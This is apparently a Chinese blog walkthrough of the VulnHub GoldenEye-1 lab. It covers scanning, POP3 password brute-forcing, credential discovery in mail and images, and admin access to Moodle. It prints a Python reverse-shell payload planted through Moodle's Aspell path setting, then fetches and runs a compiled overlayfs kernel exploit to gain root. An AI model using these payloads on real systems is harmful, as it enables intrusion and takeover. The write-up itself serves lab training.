    <title>GoldenEye-1</title>
    <url>/2021/04/14/GoldenEye-1/</url>
    <content><![CDATA[<h2 id="GoldenEye-1"><a href="#GoldenEye-1" class="headerlink" title="GoldenEye-1"></a>GoldenEye-1</h2><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h3><p>今天开始vulnhub靶场挑战之路，加油</p>
<span id="more"></span>

<h3 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02  信息收集"></a>0x02  信息收集</h3><p>使用arp-scan扫存活</p>
<p><img src="/2021/04/14/GoldenEye-1/1.png"></p>
<p>发现主机存活，使用nmap扫描端口</p>
<p><img src="/2021/04/14/GoldenEye-1/2.png"></p>
<p>访问80端口，根据提示，访问/sev-home/，是个登录页面，查看源代码，发现js文件里暴露两个名字：Boris和Natalya。对字符串符号进行html解密，密码为InvincibleHack3r。登录后，也在js文件里发现这两个用户是超级用户。尝试爆破pop3，成功爆出两个pop3邮箱服务的账号密码。分别为：(Natalya/bird,Boris/secret1!)</p>
<p><img src="/2021/04/14/GoldenEye-1/3.png"></p>
<p>使用nc登录pop3邮箱，使用retr命令查看邮件内容，在Natalya账号发现新的账号密码</p>
<p><img src="/2021/04/14/GoldenEye-1/4.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">retr 2</span><br><span class="line">+OK 1048 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from root (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 17C96454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">好的，娜塔琳，我有一个新学生给你。由于这是一个新的系统，请让我或鲍里斯知道如果你看到任何配置问题，特别是它与安全有关…即使它不是，只是进入它的伪装下的“安全”…它会得到变更单升级没有太多麻烦：）</span><br><span class="line"></span><br><span class="line">好的，用户信誉是：</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris确认她是一个有效的承包商所以就创建一个帐户好吗？</span><br><span class="line"></span><br><span class="line">如果你没有外部内部域名的网址：severnaya-station.com&#x2F;gnocertdir</span><br><span class="line">**请务必编辑您的主机文件，因为您通常在远程网络之外工作。。。。</span><br><span class="line"></span><br><span class="line">既然您是Linux用户，只需将此服务器IP指向severnaya-station.com在&#x2F;etc&#x2F;hosts中</span><br></pre></td></tr></table></figure>

<p>根据提示，ip绑定host，并且使用xenia账号成功登陆moodle系统，发现doak博士发来的新信息，猜测dock博士有pop3账号，进行爆破，得到账号(doak/goat)</p>
<p><img src="/2021/04/14/GoldenEye-1/5.png"></p>
<p><img src="/2021/04/14/GoldenEye-1/6.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Doak博士的新消息</span><br><span class="line"></span><br><span class="line">你好，Xenia，作为我们GoldenEye培训的新承包商，我欢迎你。一旦您的帐户已完成，更多的课程将出现在您的仪表板上。如果你有任何问题请给我留言。。。</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/14/GoldenEye-1/7.png"></p>
<p>登陆doak的pop3账号，发现dr_doak登陆账号，并且成功登陆web系统</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# nc 192.168.126.128 55007</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user doak</span><br><span class="line">+OK</span><br><span class="line">pass goat</span><br><span class="line">+OK Logged in.</span><br><span class="line">list</span><br><span class="line">+OK 1 messages:</span><br><span class="line">1 606</span><br><span class="line">.</span><br><span class="line">retr 1</span><br><span class="line">+OK 606 octets</span><br><span class="line">Return-Path: &lt;doak@ubuntu&gt;</span><br><span class="line">X-Original-To: doak</span><br><span class="line">Delivered-To: doak@ubuntu</span><br><span class="line">Received: from doak (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 97DC24549D</span><br><span class="line">        for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;</span><br><span class="line">Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">From: doak@ubuntu</span><br><span class="line"></span><br><span class="line">James,</span><br><span class="line">If you&#39;re reading this, congrats you&#39;ve gotten this far. You know how tradecraft works right?</span><br><span class="line"></span><br><span class="line">Because I don&#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span><br><span class="line"></span><br><span class="line">username: dr_doak</span><br><span class="line">password: 4England!</span><br></pre></td></tr></table></figure>

<p>在管理信息处发现s3cret.txt文件，下载下来，发现for-007.jpg文件。</p>
<p><img src="/2021/04/14/GoldenEye-1/8.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">007,</span><br><span class="line">我能够捕捉到这个应用程序ADM1NCR3DS通过清除txt。</span><br><span class="line">GoldenEye服务器中的大多数web应用程序中的文本都会被扫描，所以我不能在这里添加cr3元素。</span><br><span class="line">这里有一些有趣的东西：&#x2F;dir007key&#x2F;for-007.jpg</span><br><span class="line">你可能也知道，RCP-90比任何其他武器都要优越得多，而杀人执照是唯一的游戏方式。</span><br></pre></td></tr></table></figure>

<p>使用strings查看图片，发现base64加密，解密:xWinter1995x!尝试登陆web admin账号，成功登陆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Downloads# strings for-007.jpg </span><br><span class="line">JFIF</span><br><span class="line">Exif</span><br><span class="line">eFdpbnRlcjE5OTV4IQ&#x3D;&#x3D;</span><br><span class="line">GoldenEye</span><br><span class="line">linux</span><br></pre></td></tr></table></figure>

<h3 id="0x03-Getshell"><a href="#0x03-Getshell" class="headerlink" title="0x03  Getshell"></a>0x03  Getshell</h3><p>在获得对moodle的管理员访问权后，获得reverse shell相当容易。在“moodle”设置上，存在用于配置系统路径的设置。Aspell是拼写检查器，可以安装在Linux上，并且可以在moodle中用于进行拼写检查操作。每当启动拼写检查动作时，moodle就会调用Aspell二进制文件。可以编辑Aspell的路径以获得reverse shell。以下是我使用的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.129&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/14/GoldenEye-1/9.png"></p>
<p>然后将下图所示设置选项设置成:PspellShell，不设置的话，无法执行之前的payload</p>
<p><img src="/2021/04/14/GoldenEye-1/10.png"></p>
<p>任意用户post一篇博客，攻击机做好监听，即可反弹shell</p>
<p><img src="/2021/04/14/GoldenEye-1/11.png"></p>
<p><img src="/2021/04/14/GoldenEye-1/12.png"></p>
<h3 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04  提权"></a>0x04  提权</h3><p>查看linux内核，发现版本为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;tmp$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>

<p>去exploit-db网站查找提权文件，下载下来，由于目标机器没有gcc环境，但是存在cc环境，修改提权文件某处gcc为cc</p>
<p><img src="/2021/04/14/GoldenEye-1/13.png"></p>
<p>在攻击机上先编译，然后攻击机用python3开启http服务，目标机器使用wget下载已经编译好的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;power# cc 37292.c -o shell</span><br><span class="line">37292.c: In function ‘main’:</span><br><span class="line">37292.c:106:12: warning: implicit declaration of function ‘unshare’ [-Wimplicit-function-declaration]</span><br><span class="line">  106 |         if(unshare(CLONE_NEWUSER) !&#x3D; 0)</span><br><span class="line">      |            ^~~~~~~</span><br><span class="line">37292.c:111:17: warning: implicit declaration of function ‘clone’; did you mean ‘close’? [-Wimplicit-function-declaration]</span><br><span class="line">  111 |                 clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span><br><span class="line">      |                 ^~~~~</span><br><span class="line">      |                 close</span><br><span class="line">37292.c:117:13: warning: implicit declaration of function ‘waitpid’ [-Wimplicit-function-declaration]</span><br><span class="line">  117 |             waitpid(pid, &amp;status, 0);</span><br><span class="line">      |             ^~~~~~~</span><br><span class="line">37292.c:127:5: warning: implicit declaration of function ‘wait’ [-Wimplicit-function-declaration]</span><br><span class="line">  127 |     wait(NULL);</span><br><span class="line">      |     ^~~~</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;power# ls</span><br><span class="line">37292.c  shell</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;power# python3 -m http.server 8000</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http:&#x2F;&#x2F;0.0.0.0:8000&#x2F;) ...</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;tmp$ wget http:&#x2F;&#x2F;192.168.126.129:8000&#x2F;shell</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.126.129:8000&#x2F;shell</span><br><span class="line">--2021-04-14 16:44:48--  http:&#x2F;&#x2F;192.168.126.129:8000&#x2F;shell</span><br><span class="line">Connecting to 192.168.126.129:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17608 (17K) [application&#x2F;octet-stream]</span><br><span class="line">Saving to: &#39;shell&#39;</span><br><span class="line"></span><br><span class="line">100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;] 17,608      --.-K&#x2F;s   in 0s      </span><br><span class="line"></span><br><span class="line">2021-04-14 16:44:48 (379 MB&#x2F;s) - &#39;shell&#39; saved [17608&#x2F;17608]</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;tmp$ chmod +x shell</span><br><span class="line">chmod +x shell</span><br><span class="line">www-data@ubuntu:&#x2F;tmp$ ls</span><br><span class="line">ls</span><br><span class="line">shell  tinyspellt5Wvx6  vmware-root</span><br><span class="line">www-data@ubuntu:&#x2F;tmp$ .&#x2F;shell</span><br><span class="line">.&#x2F;shell</span><br><span class="line">spawning threads</span><br><span class="line">mount #1</span><br><span class="line">mount #2</span><br><span class="line">child threads done</span><br><span class="line">&#x2F;etc&#x2F;ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),33(www-data)</span><br></pre></td></tr></table></figure>

<h3 id="0x05-寻找flag"><a href="#0x05-寻找flag" class="headerlink" title="0x05  寻找flag"></a>0x05  寻找flag</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cd &#x2F;root</span><br><span class="line">cd &#x2F;root</span><br><span class="line"># ls -a</span><br><span class="line">ls -a</span><br><span class="line">.  ..  .bash_history  .bashrc  .cache  .flag.txt  .profile  .rnd  .viminfo</span><br><span class="line"># vi .flag.txt</span><br><span class="line">vi .flag.txt</span><br><span class="line">Alec told me to place the codes here:</span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">&#x2F;006-final&#x2F;xvf7-flag&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/14/GoldenEye-1/14.png"></p>
]]></content>
